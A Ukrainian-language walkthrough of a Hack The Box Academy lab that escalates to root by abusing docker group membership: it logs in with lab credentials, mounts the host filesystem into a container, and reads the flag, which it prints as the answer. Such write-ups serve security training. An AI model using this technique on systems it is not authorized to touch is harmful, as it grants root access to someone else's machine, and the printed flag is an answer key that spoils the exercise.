## Docker

Ціль: `10.129.205.237`  

Питання:
- Escalate privileges на цілі та отримати `flag.txt` у `/root`.
- Здати його вміст як відповідь.

Відповідь:
- `HTB{D0ck3r_Pr1vE5c}`

***

## Крок 1 — Логін та перевірка груп

```bash
ssh htb-student@10.129.205.237
# Password: HTB_@cademy_stdnt!

id
# uid=1001(htb-student) gid=1001(htb-student) groups=1001(htb-student),118(docker)
```

Користувач входить до групи **`docker`**, що означає наявність прав керування Docker-daemon’ом. Згідно з практикою прівеску, членство в групі `docker` майже завжди дозволяє отримати root, якщо можна запускати контейнери з параметрами типу `-v /:/mnt`. [systemweakness](https://systemweakness.com/linux-privilege-escalation-with-docker-c13fc93c64c7)

***

## Крок 2 — Перевірити доступні образи

```bash
docker image ls
```

Вивід:

```text
REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
ubuntu       latest    5a81c4b8502e   3 years ago   77.8MB
```

Маємо образ `ubuntu:latest`, який можна використати як базу для контейнера.

***

## Крок 3 — Старт Docker-контейнера з маунтом root FS хоста

Команда:

```bash
docker run -it -v /:/mnt ubuntu /bin/bash
```

Розбір: [systemweakness](https://systemweakness.com/linux-privilege-escalation-with-docker-c13fc93c64c7)

- `docker run` – запускає новий контейнер.
- `-it` – інтерактивний режим з псевдотерміналом.
- `-v /:/mnt` – **volume mount**:
  - `/:/mnt` – монтує корінь файлової системи **хоста** (`/`) у ` /mnt` всередині контейнера.
- `ubuntu` – образ.
- `/bin/bash` – командний інтерпретатор всередині контейнера.

Оскільки Docker-демон працює як root, процес усередині контейнера запускається з root-правами щодо змонтованого хостового кореня. Це класичний Docker прівеск-патерн. [rapid7](https://www.rapid7.com/db/modules/exploit/linux/local/docker_daemon_privilege_escalation/)

У контейнері:

```bash
root@f7474c21829e:/# whoami
# root
```

***

## Крок 4 — Перейти в змонтований root хоста та знайти флаг

Всередині контейнера:

```bash
root@f7474c21829e:/# cd /mnt
root@f7474c21829e:/mnt# ls
# bin boot cdrom dev etc home lib lib32 lib64 libx32 lost+found media mnt opt proc root run snap srv sys tmp usr var
```

Це **root** файлової системи хост-машини.

Далі:

```bash
root@f7474c21829e:/mnt# cd /mnt/root
root@f7474c21829e:/mnt/root# ls
# flag.txt  snap

root@f7474c21829e:/mnt/root# cat flag.txt
# HTB{D0ck3r_Pr1vE5c}
```

Отриманий флаг:

> `HTB{D0ck3r_Pr1vE5c}`

***

## Конспект команд для Docker прівеску

1. Логін:

   ```bash
   ssh htb-student@10.129.205.237
   # Password: HTB_@cademy_stdnt!

   id
   # ... groups=...,118(docker)
   ```

2. Переглянути образи:

   ```bash
   docker image ls
   # ubuntu:latest
   ```

3. Запустити контейнер, змонтувавши root FS хоста:

   ```bash
   docker run -it -v /:/mnt ubuntu /bin/bash
   ```

4. Усередині контейнера (як root):

   ```bash
   cd /mnt/root
   ls        # flag.txt  snap
   cat flag.txt
   # HTB{D0ck3r_Pr1vE5c}
   ```

5. Здати флаг:

   ```text
   HTB{D0ck3r_Pr1vE5c}
   ```
